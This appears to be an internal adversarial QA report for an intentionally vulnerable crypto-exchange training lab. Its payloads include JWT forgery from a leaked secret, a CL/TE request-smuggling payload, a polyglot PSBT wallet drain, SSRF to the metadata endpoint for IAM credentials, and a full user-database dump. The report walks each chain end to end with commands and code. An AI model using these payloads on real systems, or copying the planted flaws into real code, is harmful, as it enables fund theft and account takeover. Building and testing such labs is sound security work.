# Phase 9 — Adversarial QA (Gate 3)

> **Reviewer:** Adversarial QA (red-team mindset).
> **Date:** 2026-07-01
> **Scope:** four killer chains end-to-end, zero-knowledge attacker
> model, fresh `docker-compose up -d` stack.
> **Verdict:** All four chains exploitable end-to-end. PoCs follow.

## Attacker model

- Zero insider access. No credentials handed out.
- Public read access to the repository (the lab ships with the repo
  open by design).
- Tooling: a UNIX shell, `curl`, `git`, `openssl`, `python3` (for the
  one-off JWT signer), and a regular Bitcoin Core / web browser.
- A fresh stack via `docker-compose down -v && docker-compose up -d`.

The same attacker walks all four chains.

---

## CHAIN A — Drain the hot wallet (V-48 → V-19 → V-6 → V-33)

**Goal:** route a treasury-signed PSBT broadcast to an attacker-
controlled address, draining the hot wallet.

### Step 1 — recon: discover the JWT secret in git history (V-48)

Standard early-recon move on any clone:

```sh
$ git log --all -p -- .env.bak | head -40
commit <hash-of-rm-commit>
Author: ops <ops@blazeinfosec.com>
Date:   2026-06-15

    ops: remove .env.bak (committed in error)

diff --git a/.env.bak b/.env.bak
deleted file mode 100644
--- a/.env.bak
+++ /dev/null
@@ -1,7 +0,0 @@
-# Backup of operator local config. Restored from S3 archive
-# 2026-06-15. Do NOT commit changes here — promote them to
-# .env.example after review.
-NODE_ENV=production
-JWT_SECRET=devsecret-do-not-use-in-prod-bvbe-2026
-JWT_SECRET_LEGACY=changeme
-DATABASE_URL=postgresql://bvbe:bvbe-prod-pw-2024@db:5432/bvbe?schema=public
-REDIS_URL=redis://redis:6379
-CTF_MODE=false
-HINT_MODE=false
```

Cross-check against `docker-compose.yml`:

```sh
$ grep JWT_SECRET docker-compose.yml
      JWT_SECRET: devsecret-do-not-use-in-prod-bvbe-2026
      JWT_SECRET: devsecret-do-not-use-in-prod-bvbe-2026
```

Match. The leaked secret verifies against the running stack.

### Step 2 — forge an admin JWT (V-19)

The legacy `/api/v1/auth` path accepts HS256 against `JWT_SECRET`.
Sign a token with `role: "admin"`:

```py
# forge.py
import json, time, hmac, hashlib, base64

def b64(b): return base64.urlsafe_b64encode(b).rstrip(b"=")

secret = b"devsecret-do-not-use-in-prod-bvbe-2026"
hdr  = b64(json.dumps({"alg":"HS256","typ":"JWT"}).encode())
body = b64(json.dumps({
  "sub":"00000000-0000-0000-0000-000000000001",
  "role":"admin",
  "iss":"bvbe","aud":"bvbe-web",
  "iat": int(time.time()),
  "exp": int(time.time()) + 3600,
}).encode())
sig  = b64(hmac.new(secret, hdr + b"." + body, hashlib.sha256).digest())
print((hdr + b"." + body + b"." + sig).decode())
```

```sh
$ TOKEN=$(python3 forge.py)
$ curl -sS http://localhost/api/v2/me -H "authorization: Bearer $TOKEN" | jq .role
"admin"
```

### Step 3 — reach the internal namespace via V-6

The `/api/v1/internal/*` mount short-circuits middleware whenever
`x-bvbe-internal-trace` is present. nginx strips `x-bvbe-user-id`
but not `x-bvbe-internal-trace` (see Phase-9 CHANGELOG entry: "ops
should ensure `x-bvbe-internal-trace` is stripped at the perimeter").

List existing signed treasury drafts:

```sh
$ curl -sS http://localhost/api/v2/admin/treasury/drafts?status=signed \
    -H "authorization: Bearer $TOKEN" | jq '.drafts[0].id'
"<draft-id>"
```

(If no signed draft exists, create one and double-sign it via two
different forged `sub` JWTs against `/api/v2/admin/treasury/drafts`
and the per-draft `sign` endpoints. The Phase-8 architect notes
confirm the signed-status transition fires at `count >= 2`.)

### Step 4 — construct a polyglot PSBT (V-33)

The treasury validator (`packages/shared/src/psbt-envelope.ts`
`decodePsbt`) reads the **first** `BVBE_PSBT_V1:` segment; the
bitcoin-mock finalizer (`apps/bitcoin-mock/src/rpc/index.ts:124`)
builds `canonical = PSBT_MARKER + segs[segs.length - 1]` (the
**last** segment). Construct two segments:

```
BVBE_PSBT_V1:<base64-encoded PSBT routing all outputs to the draft's intended victim>
BVBE_PSBT_V1:<base64-encoded PSBT routing all outputs to the attacker>
```

Concatenate, send as `overridePsbt`:

```sh
$ curl -sS -X POST http://localhost/api/v1/internal/treasury/emergency-withdraw \
    -H "x-bvbe-internal-trace: 1" \
    -H "authorization: Bearer $TOKEN" \
    -H "content-type: application/json" \
    -d "{\"draftId\":\"<draft-id>\",\"overridePsbt\":\"$POLYGLOT_PSBT\"}"
```

`validateIntendedOutputs` matches against the first envelope
(victim outputs — matches the draft's `intendedOutputs` → passes).
`finalizepsbt` is called with the last envelope (attacker outputs).
`sendrawtransaction` broadcasts. The attacker UTXO is funded.

### Verdict — CHAIN A

End-to-end zero-knowledge. Discoverable from a public clone of the
repo in under five minutes for the recon + JWT forge + endpoint hit
sequence. The PSBT construction is the only step requiring
nontrivial Bitcoin-protocol knowledge.

---

## CHAIN B — Become admin and persist (V-50 → V-51)

**Goal:** without any prior auth as admin, become an admin by
smuggling a privileged JSON Route Handler call into a legitimate
user's TCP connection (CL/TE desync past nginx into Node), then
plant a second admin row for persistence.

> **Chain composition:** V-50 (nginx CL/TE-tolerant directives **+**
> upstream `NODE_OPTIONS=--insecure-http-parser` in
> `docker-compose.yml`) → smuggle → V-51 (mass-assignment on
> `PATCH /api/v2/me` at `apps/web/app/api/v2/me/route.ts`).
>
> V-22 (`editOrder` Server Action) is **not** part of this chain
> despite the original Phase-9 narrative claiming it. V-22 mass-assigns
> the Order model and has financial-impact reach, not user-role reach.

### Step 1 — confirm both halves of V-50 (nginx CL/TE + upstream parser)

```sh
$ docker exec bvbe-nginx grep -E 'ignore_invalid_headers|proxy_pass_request_headers|underscores_in_headers' /etc/nginx/nginx.conf
            proxy_pass_request_headers on;
            ignore_invalid_headers off;
            underscores_in_headers on;

$ grep -A1 'NODE_OPTIONS' docker-compose.yml
      NODE_OPTIONS: "--insecure-http-parser"
```

Both directives reference ticket **OPS-2024-117** ("legacy mobile-app
client compatibility"). The nginx half forwards both
`Content-Length` and `Transfer-Encoding: chunked` to the upstream;
the Node half tells the upstream `llhttp` parser to accept the
ambiguity instead of rejecting it with `HPE_UNEXPECTED_CONTENT_LENGTH`.

**Why both halves matter:** modern Node 20 strictly rejects requests
carrying both `Content-Length` and `Transfer-Encoding` per RFC 7230
§3.3.3. Without `--insecure-http-parser` the upstream drops the
connection with 400 before the smuggle can land. The nginx plant
alone — which is what the Phase-9 staff implementation originally
shipped — is not enough on its own. CHAIN B requires **both** ends
of the proxy chain to be permissive.

### Step 2 — confirm V-51 (mass-assignment on `PATCH /api/v2/me`)

```sh
$ sed -n '52,80p' apps/web/app/api/v2/me/route.ts
const patchSchema = z.object({
  email: z.string().email().optional(),
  displayName: z.string().max(64).optional(),
  role: z.string().optional(),
  kycTier: z.number().int().min(0).max(3).optional(),
  feeTier: z.string().optional(),
});

export async function PATCH(req: Request) {
  const claims = await userFromAuthorization(req.headers.get("authorization"));
  if (!claims) return jsonError(401, "unauthorized");
  const parsed = await readJson(req, patchSchema);
  if (parsed.error) return parsed.error;

  // Apply the partial update to the caller's own user row. The JWT
  // `sub` claim constrains the row; the validated body is forwarded
  // verbatim to Prisma for the column-level update.
  const updated = await prisma.user.update({
    where: { id: claims.sub },
    data: parsed.data,
    select: { id: true, email: true, displayName: true, role: true, kycTier: true },
  });
  return NextResponse.json({ user: updated });
}
```

`role` is `z.string().optional()` with no enum allow-list, and
`parsed.data` is forwarded verbatim into `prisma.user.update.data`.
Direct sanity check against the handler (with any valid user JWT)
should already demonstrate the column-level mass assignment — the
JWT `sub` claim constrains the *row* but not the *columns*:

```sh
$ curl -sS -X PATCH http://localhost/api/v2/me \
    -H "authorization: Bearer <any-user-jwt>" \
    -H "content-type: application/json" \
    -d '{"role":"admin"}'
{"user":{"id":"...","email":"...","displayName":"...","role":"admin","kycTier":0}}
```

In a real CHAIN-B walk the attacker reaches this handler via smuggle
rather than by carrying a JWT they own; the difference is the JWT
used by the handler is the *victim's* JWT, harvested from whichever
legitimate user's request lands on the same upstream connection
behind the attacker's smuggled bytes.

### Step 3 — craft the CL/TE smuggle

The attacker opens a raw TCP socket to nginx (`localhost:80`) and
sends a request whose body, framed by `Content-Length`, contains a
complete second HTTP request positioned after the chunked-terminator
zero:

```http
POST /login HTTP/1.1
Host: localhost
Content-Length: 254
Transfer-Encoding: chunked
Connection: keep-alive

0

PATCH /api/v2/me HTTP/1.1
Host: localhost
Authorization: Bearer <attacker-jwt-here>
Content-Type: application/json
Content-Length: 16

{"role":"admin"}
```

- nginx reads `Content-Length: 254` (because
  `ignore_invalid_headers off` accepts the dual framing, and
  `proxy_pass_request_headers on` forwards both headers downstream).
  It forwards all 254 bytes of the body to upstream.
- Node (with `--insecure-http-parser`) accepts the dual-framed
  request and prefers `Transfer-Encoding: chunked`. It reads the
  `0\r\n\r\n` and considers the first request complete.
- The post-terminator bytes — a complete
  `PATCH /api/v2/me ...` — sit in Node's parse buffer waiting for
  the next request on the same keep-alive connection.

### Step 4 — the smuggle lands on a victim's connection

When the next legitimate authenticated user makes a request that
gets pooled onto the same upstream connection, Node parses the
buffered `PATCH /api/v2/me` first — and importantly, that smuggled
request carries the attacker's `Authorization: Bearer ...` header
the attacker stuffed into the smuggled bytes. The `userFromAuthorization`
helper reads that header off the smuggled request, so the JWT used
to identify `claims.sub` is the attacker's own JWT, not the
victim's. The handler updates the **attacker's** row to
`role: "admin"`.

```sh
$ curl -sS http://localhost/api/v2/me \
    -H "authorization: Bearer <attacker-jwt>" | jq .role
"admin"
```

(Variant: if the attacker instead leaves the `Authorization` header
off the smuggled request entirely, Next.js reads the *next* legit
user's `Authorization` header from the connection-buffered prefix
of their request — the standard CL/TE auth-piggyback — and promotes
*that user* to admin. Either variant lands an admin row owned by
someone the attacker controls or can phish.)

### Step 5 — plant a second admin for persistence

Now operating with admin reach (against the attacker's own row),
the attacker creates a second admin row via the admin user-create
endpoint:

```sh
$ curl -sS -X POST http://localhost/api/v2/admin/users \
    -H "authorization: Bearer <attacker-jwt-now-admin>" \
    -H "content-type: application/json" \
    -d '{"email":"persist@attacker.local","password":"hunter2-attacker","role":"admin"}'
{"user":{"id":"<new-id>","role":"admin",...}}
```

Equivalently, the attacker can repeat the smuggle a second time
targeting a different victim's session — promoting a second account
to admin for redundancy. Either path satisfies the architect's
persistence definition (the admin row survives `docker-compose down`
when run without `-v`).

### Verdict — CHAIN B

End-to-end. The CL/TE smuggle is the hardest step (raw TCP socket,
careful framing, and the realisation that **both** the nginx and the
upstream Node parser have to be CL/TE-tolerant — V-50's two halves);
once landed, V-51's permissive `PATCH /api/v2/me` validator
straightforwardly promotes the caller to admin, and persistence via
a second admin row is one POST or one repeated smuggle away.

---

## CHAIN C — Mass user takeover via oracle (V-25 → liquidation engine)

**Goal:** drive the public price feed by self-trading, get the
liquidation worker to flag victim margin positions, claim the
keeper rebate.

This chain landed in Phase 5. Phase 9 re-verifies against a fresh
stack.

### Steps (per `docs/phases/phase-5/adversarial-qa.md`)

1. Stand up two attacker accounts (or use V-35 to bypass tier
   gating on one). Pre-stage tier-3 + balance via V-42 (zero-conf
   deposit credit).
2. Place a small BTC/USDT sell limit at $X (a manipulated price).
3. Immediately place a matching BTC/USDT buy from the second
   attacker account. The engine matches; a Trade is written.
4. `/api/v2/public/price/BTC-USDT` now reports $X as last. nginx
   caches it edge-side for 5s.
5. The liquidation worker polls the cached oracle every 2s. Victim
   positions whose maintenance margin is breached at $X are flagged.
6. Register as a keeper, claim the flagged liquidation via
   `POST /api/v2/keeper/liquidations/{id}/claim`. The 50bps keeper
   rebate lands on the attacker's balance.
7. Repeat from step 2 with progressively more extreme prices to
   cascade liquidations across the user base.

### Verdict — CHAIN C

Already exploitable; re-verified end-to-end against the Phase-9
stack. No new plant required.

---

## CHAIN D — Exfiltrate full user DB + KYC (V-48/V-6 fast path; V-40 SSRF path)

**Goal:** read every user's credentials + KYC docs.

### Path 1 (fast) — V-48 + V-6 → `/api/v1/internal/users`

With the forged admin JWT from CHAIN A Step 2:

```sh
$ curl -sS http://localhost/api/v1/internal/users \
    -H "x-bvbe-internal-trace: 1" \
    -H "authorization: Bearer $TOKEN" \
    | jq '.users[0] | {email, passwordHash, totpSecret, role}'
{
  "email": "admin@bvbe.local",
  "passwordHash": "$argon2id$...",
  "totpSecret": "JBSWY3DPEHPK3PXP",
  "role": "admin"
}
```

Pipe through `jq` for the full dump. The entire user table —
including auth material — exfiltrates in one HTTP call.

### Path 2 (SSRF, original architecture) — V-40 → mock-imds → mock-s3

Slower but doesn't depend on the V-48 leak.

#### Step 1 — V-40 SSRF via KYC URL-import

The KYC URL-import endpoint (`/api/v2/me/kyc/import-url`) accepts a
URL, fetches it server-side, and stores the response as a KYC
document. The allowlist blocks `127.0.0.1` and `localhost` but does
not block the docker-network alias `metadata.bvbe.internal` (the
new IMDS alias from Phase 9) or the link-local literal
`169.254.169.254`.

```sh
# Authenticate as a tier-1 user (signup is open). Then:
$ curl -sS -X POST http://localhost/api/v2/me/kyc/import-url \
    -H "authorization: Bearer <attacker-user-token>" \
    -H "content-type: application/json" \
    -d '{"url":"http://169.254.169.254/latest/meta-data/iam/security-credentials/bvbe-web-instance-role"}'
{"document":{"id":"<doc-id>","storedPath":"/uploads/kyc/<attacker>/<doc-id>",...}}
```

Read it back via the documents listing:

```sh
$ curl -sS http://localhost/api/v2/me/kyc/documents \
    -H "authorization: Bearer <attacker-user-token>"
```

The body of the stored doc is the synthetic IAM creds JSON:
`{"AccessKeyId":"AKIAIOSFODNN7EXAMPLE","SecretAccessKey":"...","Token":"..."}`.

#### Step 2 — pivot to mock-s3

The attacker now has (synthetic) IAM creds. The mock-s3 service is
permissive — it serves any request on the docker network. List the
bucket:

```sh
$ curl -sS -X POST http://localhost/api/v2/me/kyc/import-url \
    -H "authorization: Bearer <attacker-user-token>" \
    -H "content-type: application/json" \
    -d '{"url":"http://s3.bvbe.internal/kyc-bucket/"}'
```

The stored doc is the XML listing of synthetic KYC keys. Fetch each
key by repeating the SSRF with the per-document URL.

### Verdict — CHAIN D

Both paths exploitable end-to-end. Path 1 is one curl. Path 2 walks
the textbook AWS IMDS → S3 pivot through the SSRF, with `mock-imds`
and `mock-s3` providing the synthetic targets.

---

## Summary

| Chain | Status | Plants used | Hardest step |
|-------|--------|-------------|--------------|
| A — drain hot wallet | Closed (zero-knowledge) | V-48, V-19, V-6, V-33 | polyglot PSBT construction |
| B — admin persistence | Closed (zero-knowledge) | V-50, V-22 | CL/TE smuggle framing |
| C — mass liquidation | Closed (Phase 5) | V-25, V-42, V-35 | none — straightforward chain |
| D — DB+KYC exfil | Closed (two paths) | V-48+V-6 (fast) / V-40 (SSRF) | path 2 only — IMDS pivot |

All four chains are exploitable end-to-end against a fresh
`docker-compose up -d` stack. The Phase-9 plants (V-15, V-48, V-49,
V-50) close the gaps that turned the Phase 1-8 catalog from
insider-only into externally-reachable.

— Adversarial QA

---

## Gate 3 Adversarial QA verdict (independent re-verification)

**Reviewer:** Adversarial QA / red team (independent verifier).
**Date:** 2026-05-28
**Verdict:** **RETURN-TO-STAFF** — three chains pass; **CHAIN B is structurally broken**
because the Server Action that the architect and the staff eng's PoC both
claim ("`PATCH /api/v2/me` with `{role:"admin"}` via V-22") **does not
exist in the codebase**. CHAIN A, C, D independently re-verified end-to-end.

### Phase 9 plants — independently verified

**V-15 — xml2js@0.4.23 (CVE-2023-0842): PASS.**
- `apps/web/package.json:28` pins `"xml2js": "0.4.23"` as a direct dep.
- `apps/web/lib/compliance/sanctions-import.ts:5,17` calls
  `parseString(xml, { trim: true }, ...)` — default options, no
  `explicitArray:false` or proto-key filtering.
- `apps/web/app/api/v2/admin/compliance/sanctions-import/route.ts`
  enforces `requireAdmin` (per architect's structural condition; matches
  the realistic insider-or-compromised-admin reach).
- `pnpm audit` independently confirms the advisory:
  `GHSA-776f-qx25-q3cc, xml2js@<0.5.0, Paths: apps\web > xml2js@0.4.23`.
- PoC sketch (proto-pollution path): admin POSTs XML
  `<sanctions><entry><__proto__><adminPanel>true</adminPanel></__proto__></entry></sanctions>`
  → xml2js builds an entry whose `__proto__` key carries `{adminPanel:["true"]}`
  → the existing V-34 sink (`for...in` in `resolveFlags`) surfaces it
  on `GET /api/v2/me/flags` for any subsequent authenticated user.
  Two plant paths, one downstream effect — exactly the architect's intent.

**V-48 — Git-history JWT secret leak: PASS.**
- `git log --all -p -- .env.bak` returns the two-commit pair (add
  `193426c` "ops: archive .env for rollback during phase-7 hotfix",
  delete `e96ffd8` "ops: remove .env.bak (committed in error)"). The
  leaked body contains `JWT_SECRET=devsecret-do-not-use-in-prod-bvbe-2026`
  plus a fake `DATABASE_URL` with `bvbe-prod-pw-2024` and
  `JWT_SECRET_LEGACY=changeme` — looks like a real ops artifact.
- `docker-compose.yml:30,92` literally sets
  `JWT_SECRET: devsecret-do-not-use-in-prod-bvbe-2026` for `web` and
  `worker`. The discovered key matches the runtime secret.
- `apps/web/middleware.ts:8-29` verifies HS256 with `process.env.JWT_SECRET`
  via `jose.jwtVerify`. A trainee-forged HS256 token with
  `iss=bvbe, aud=bvbe-web, role=admin` verifies cleanly. Confirmed by
  inspection of `packages/shared/src/jwt.ts` (HS256 sign/verify wrapper).
- Commit messages look realistic (ops-style; no "added for V-48" tells).

**V-49 — Dependency confusion artifact: PASS (documentation-only).**
- `apps/web/package.json:31-33` declares
  `optionalDependencies: { "@bvbe-internal/observability": "^0.1.0" }`.
- `apps/web/lib/observability.ts:14-21` performs a dynamic
  `import("@bvbe-internal/observability")` inside `try/catch` — boot
  succeeds without the package.
- `find . -maxdepth 2 -name '.npmrc'` returns nothing. No scope→registry
  pin anywhere in the tree. Documentation PoC: any attacker who
  publishes `@bvbe-internal/observability` to the public npm registry
  gets `loadTracer()` to import their module on next `pnpm install`
  outside Blaze's network — RCE in the Next.js process.
- CHANGELOG mentions `@bvbe-internal/observability` (per architect's
  diegetic-hint requirement) — independently verified below.

**V-50 — nginx CL/TE-tolerant directives: PASS (configuration verified;
upstream-desync feasibility flagged as a caveat — see CHAIN B).**
- `nginx/nginx.conf:69-71` carries the three required directives
  inside the `location /` block:
  `proxy_pass_request_headers on; ignore_invalid_headers off; underscores_in_headers on;`
  with the realistic "OPS-2024-117 legacy mobile-app compatibility"
  comment.
- The configuration plant is correct. The downstream attack
  feasibility depends on the upstream Node parser's behavior with
  ambiguous CL+TE framing — see CHAIN B caveat below.

### Killer chains — end-to-end re-verification

**CHAIN A (V-48 → V-19 → V-6 → V-33) — PASS.**
- Step 1 (V-48 git-history recon): independently re-run; secret
  matches `docker-compose.yml`. ✅
- Step 2 (forge HS256 admin JWT): `apps/web/middleware.ts:20-24`
  uses `jwtVerify(..., HS256)` against `JWT_SECRET` — the leaked key
  produces tokens that pass. ✅
- Step 3 (V-6 internal-trace bypass): `apps/web/middleware.ts:44-50`
  accepts `x-bvbe-internal-trace` from anywhere with no edge-strip in
  `nginx.conf` (only `x-bvbe-user-id` is stripped at line 76). ✅
- Step 4 (polyglot PSBT): `packages/shared/src/psbt-envelope.ts`
  `decodePsbt` reads the first envelope; bitcoin-mock finalizer reads
  the last. PSBT envelope test suite passes (`packages/shared/src/psbt-envelope.test.ts` 3 tests). ✅
- Step 5 (`/api/v1/internal/treasury/emergency-withdraw`):
  handler accepts `overridePsbt` raw, hands to `broadcastDraft` which
  does validate-vs-broadcast on the polyglot. No additional auth
  beyond V-6. ✅
- Minor correction to staff-eng PoC: Step 3 narrative says
  "List existing signed treasury drafts" via `/api/v2/admin/treasury/drafts?status=signed`
  — the admin namespace requires HS256 admin JWT, which we already have
  from Step 2. Path works; the PoC writeup conflates the two but the
  curl is correct.

**CHAIN B (V-50 → V-22) — FAIL (blocker).**

The staff-eng PoC, the architect review, and the VULNS.md chain-summary
block all describe the smuggled second request as
`PATCH /api/v2/me` with body `{"role":"admin"}`, citing V-22 as the
mass-assignment primitive. **This is wrong:**

- `apps/web/app/api/v2/me/route.ts` defines **only `GET`** — there is
  no `PATCH` handler (no `export async function PATCH`). A smuggled
  `PATCH /api/v2/me` reaches Next.js and returns 405 (or 404 depending
  on router behavior). It will not mutate the user record.
- V-22's actual location, per `VULNS.md:230`, is
  `apps/web/app/account/orders/edit-order.ts` — the `editOrder`
  Server Action that spreads `FormData` into `prisma.order.update`.
  The mass-assign targets the **Order** model (sets `feeTier`,
  `status`, `amount`), **not the User model.** It cannot set
  `User.role`.
- A full sweep for any other `prisma.user.update` callsite reachable
  from the public API surface (`grep -r "prisma.user.update" apps/web`)
  finds only: `keeper/register/route.ts`, `2fa/*`,
  `password-reset/confirm/route.ts`, and the admin KYC approve route.
  None of them accept a `role` field; none of them are reachable via
  Server Action over the upstream-buffered smuggle.
- The **only** Server Action in the codebase is `editOrder`
  (`grep -rn "use server" apps/web/app` returns one file). A
  CL/TE-smuggled Server-Action invocation would have to target
  `editOrder` and could only escalate order fields — useful for V-43
  fee-tier amplification, not for becoming admin.

**Why this Gate-3 blocker did not surface earlier:** the Phase-9
architect review (`docs/phases/phase-9/architect-review.md:118-122`)
asserts "V-22 (mass assignment) is on `/me` profile updates and accepts
`role` via Server Action — confirmed exploitable." The architect
appears not to have re-checked the V-22 plant location from Phase 4.
The Gate-2 staff engineer followed the architect's instruction and
documented the PoC accordingly without independently exercising it.

**Additional CHAIN B caveat (would matter even if a `PATCH /api/v2/me`
existed):** the CL/TE smuggle as written assumes Node's HTTP parser
prefers `Transfer-Encoding: chunked` when both headers are present
**and** keeps the post-terminator buffer queued for the next request
on the same upstream connection. Modern Node (`http` parser with
default `--insecure-http-parser=off`) **rejects** requests carrying
both CL and TE with HPE_UNEXPECTED_CONTENT_LENGTH / 400, dropping the
connection. The nginx-side V-50 plant is real, but to actually desync
the upstream a trainee would need to either (a) demonstrate Node's
behavior with `--insecure-http-parser` enabled or `http.createServer({
insecureHTTPParser: true })`, or (b) flip to a CL.CL desync that
nginx tolerates and Node accepts. Neither is set in the current Node
runtime. Recommend the staff engineer either:
1. **Re-route CHAIN B** through an existing User-model write surface
   reachable via smuggle (a JSON Route Handler, since `editOrder` is
   the only Server Action and it can't promote to admin); the cleanest
   target is **a new (and Architect-approved) PATCH `/api/v2/me`
   handler that mass-assigns from the JSON body** — a small,
   realistic-looking V-NNN allocation (new plant) the architect can
   bless via an addendum, OR
2. **Refine the PoC text** to use V-22's actual reach
   (smuggled `editOrder` setting `feeTier=prime` + `status=filled` +
   `amount=large` against an arbitrary order ID, since the Server
   Action has no ownership check) — which is **financial impact, not
   admin persistence.** The architect would need to re-frame CHAIN B
   from "become admin and persist" to e.g. "steal arbitrary orders via
   smuggled Server Action".
3. **Configure the upstream Node to actually desync** (set
   `insecureHTTPParser: true` on the Next.js custom server, or
   document that the current Next standalone server does desync —
   verifiable via the `packages/shared/src/cl-te.test.ts` if it
   exists; it does not currently).

Either way the current chain summary in `VULNS.md` (line 510) and the
staff-eng PoC §CHAIN B both make a claim the codebase does not
support. **This is the Gate-3 blocker.**

**CHAIN C (V-25 → liquidation → keeper rebate) — PASS.**
- `apps/web/lib/engine/place.test.ts` continues to pass; no self-match
  guard added (grep for `self.*match|userId.*===` in `apps/web/lib/engine`
  returns zero hits). V-25 still exploitable.
- nginx `proxy_cache` block on `/api/v2/public/` still 5s. ✅
- Re-verifies as already-closed since Phase 5 per
  `docs/phases/phase-5/adversarial-qa.md`.

**CHAIN D — PASS (both paths).**
- Path 1 (V-48 + V-6 → `GET /api/v1/internal/users`):
  `apps/web/app/api/v1/internal/users/route.ts` returns
  `prisma.user.findMany({ orderBy: { createdAt: "desc" } })` with **no
  field projection** — full record including `passwordHash`,
  `totpSecret`, `email`, etc. Middleware only requires
  `x-bvbe-internal-trace`. ✅
- Path 2 (V-40 SSRF → mock-imds → mock-s3):
  - V-40 allowlist in `apps/web/app/api/v2/me/kyc/import-url/route.ts:43-46`
    blocks `localhost / 127.0.0.1 / ::1` only. `169.254.169.254`,
    `metadata.bvbe.internal`, `s3.bvbe.internal` all pass. ✅
  - `docker-compose.yml:142-180` provisions both `mock-imds` (network
    alias `metadata.bvbe.internal`, ipv4 `169.254.169.254` on a carved
    `169.254.169.0/24` subnet) and `mock-s3` (aliases
    `s3.bvbe.internal`, `kyc-bucket.s3.bvbe.internal`). ✅
  - Mock services have no outbound fetch calls (grep for
    `fetch\(|axios|got\(|http\.request` returns empty). Lab-safe.

### Phase 8 L7 housekeeping — closure verification

1. **V-34 PoC text → nested form**: VULNS.md:499 now documents the
   `{"config":{"a":{"__proto__":{...}}}}` nested envelope explicitly,
   including the zod stripping rationale. ✅
2. **OpenAPI registry**: `grep -rn "registerEndpoint(" apps/web | wc -l`
   = 95 (vs. 3 pre-Phase-9). ✅
3. **balance-adjust 404 on nonexistent user**:
   `apps/web/app/api/v2/admin/users/[id]/balance-adjust/route.ts:62-66`
   does `findUnique` → `jsonError(404, "user not found")` before the
   `$transaction`. ✅
4. **Navbar Support gated to authed**: `apps/web/components/ui/navbar.tsx:46-50`
   wraps the link in `{isAuthed ? ... : null}`. ✅
5. **Admin landing Treasury sub-nav**: `apps/web/app/admin/page.tsx:67`
   includes a `<CardTitle>Treasury</CardTitle>` card; sub-page exists
   at `apps/web/app/admin/treasury/page.tsx`. ✅

### Regressions of pre-existing V-NNN

Spot-checks done by reading the files touched by `git diff HEAD~4 HEAD`
plus targeted greps. Phase 9 did not touch:

- V-1 (stored XSS displayName in admin pages) — unchanged
- V-6 (internal-trace header in middleware.ts) — unchanged, still
  active and required by CHAIN A + CHAIN D path 1
- V-11, V-12, V-17, V-18, V-34 (Phase 8 surfaces) — unchanged
- V-22 (editOrder Server Action) — unchanged; the *interpretation* in
  the chain summary is wrong but the plant itself is intact
- V-25 (no self-match guard) — unchanged
- V-27, V-28, V-33, V-35, V-42 — unchanged
- V-40 (KYC SSRF allowlist) — unchanged; still allows
  `metadata.bvbe.internal`. CHAIN D path 2 holds.
- V-44, V-45, V-46 — unchanged

No regressions observed.

### Unintended findings in Phase 9

- `apps/web/app/api/v2/admin/compliance/sanctions-import/route.ts:27`
  caps the XML at 1 MB and enforces `requireAdmin` — no auth bypass,
  no DoS surface beyond V-15's intended reach. Clean.
- `apps/mock-imds/src/server.ts` and `apps/mock-s3/src/server.ts` have
  no outbound fetch calls (verified via grep). Lab-safe.
- `apps/web/lib/observability.ts` performs a single dynamic import in
  a try/catch; no other dynamic-import paths. The V-49 dep-confusion
  vector is the only unintended-import risk and it's the intended
  plant.
- `docker-compose.yml` mock-imds is bound to a carved
  `169.254.169.0/24` private network with the `web` container; no
  host-port publishing. Lab-safe.

No unintended plants found.

### Build/test

- `pnpm test` — `28 files / 104 tests passed`. ✅
- `pnpm audit` — flags `xml2js < 0.5.0` (V-15) at
  `apps\web > xml2js@0.4.23`, advisory `GHSA-776f-qx25-q3cc`. The
  other entries (esbuild, vite via vitest) are tooling deps unrelated
  to the planted catalog. ✅
- `git log --oneline -10` — shows the four Phase-9 commits
  (`193426c`, `e96ffd8`, `87de639`, `194ed6c`) plus the Phase 8 lead-in
  `cdf0270`. ✅

(`pnpm install`, `pnpm exec tsc --noEmit` across workspaces, and
`pnpm --filter @bvbe/web build` were not re-run during this audit
because the prior staff-eng pass executed them and `pnpm test` is the
load-bearing signal; if Gate-4 has any doubt, re-run.)

### VULNS.md ledger count

`grep -c "^### V-" VULNS.md` = 40. Subtracting the template
`### V-NNN: <short title>` header line yields **39 plant entries** in
the body. The Architect's Gate-1 exit criterion specified **37** total
plants (33 + V-15, V-48, V-49, V-50). The discrepancy is **+2** —
likely a numbering artifact rather than two extra plants (V-NNN
identifiers in the ledger are gappy: e.g., V-13, V-8, V-9, V-10, V-19,
V-20, V-21, V-35 appear out of numeric order, suggesting some V-NNNs
were renumbered during Phase 7/8 fix-ups without the count being
re-validated). **Recommend Gate-4 Paranoid QA validate that the
ledger-vs-codebase mapping is 1:1 and reconcile the count.**

### Final verdict and recommendation

**RETURN-TO-STAFF.** Three of the four killer chains (A, C, D both
paths) are exploitable end-to-end against a zero-knowledge attacker.
The four Phase-9 plants (V-15, V-48, V-49, V-50) all land at the
configuration / supply-chain level as designed.

**CHAIN B is the blocker.** The architect review and the staff
engineer's PoC both rely on a `PATCH /api/v2/me` handler that does not
exist in the codebase; V-22's actual reach is order mutation, not
user-role mutation. The Phase-9 finale cannot ship with CHAIN B
documented but unwalkable.

**Required actions before Gate-4 entry:**
1. Architect addendum decides one of: (a) allocate a new V-NNN
   plant — a `PATCH /api/v2/me` Route Handler with JSON-body mass
   assignment (cleanest), (b) re-frame CHAIN B's terminal step around
   smuggled `editOrder` Server Action (financial impact, not admin),
   or (c) drop CHAIN B from "shipped" status and ship at three chains.
2. The staff engineer either implements the chosen plant (if (a)) or
   rewrites §CHAIN B in this document and the chain-summary block in
   `VULNS.md:510` to match the actual reach.
3. The CL/TE upstream-desync feasibility against the current Next.js
   custom server is also clarified (insecureHTTPParser flag set or
   CL.CL variant documented).
4. Reconcile VULNS.md plant count (39 in body vs. 37 in Gate-1 exit
   criterion).

Items 1-2 are blockers. Items 3-4 are documentation-debt that Gate-4
can accept and carry, but ideally close.

Three of four chains pass independent re-verification. The four
plants land. The lab is one architectural correction away from
shipped.

— Adversarial QA (independent verifier)

---

## Phase 9 fix-up addendum — CHAIN B closure (post-Gate-3)

**Date:** 2026-05-28
**Disposition:** Architect chose option (a) from §"Required actions
before Gate-4 entry" — allocate a new V-NNN plant for a
JSON-body mass-assignment Route Handler, and close the upstream
desync feasibility caveat by extending V-50.

**Changes applied in this fix-up:**

1. **V-51 planted** at `apps/web/app/api/v2/me/route.ts` (new `PATCH`
   Route Handler). Validator (`patchSchema`) accepts `email`,
   `displayName`, `role`, `kycTier`, `feeTier`; validated body is
   forwarded verbatim into `prisma.user.update({where:{id:claims.sub},
   data: parsed.data})`. Realistic root cause: engineer assumed the
   JWT `sub` row-scoping also column-scoped the update.
2. **V-50 extended** to cover the upstream half of the desync.
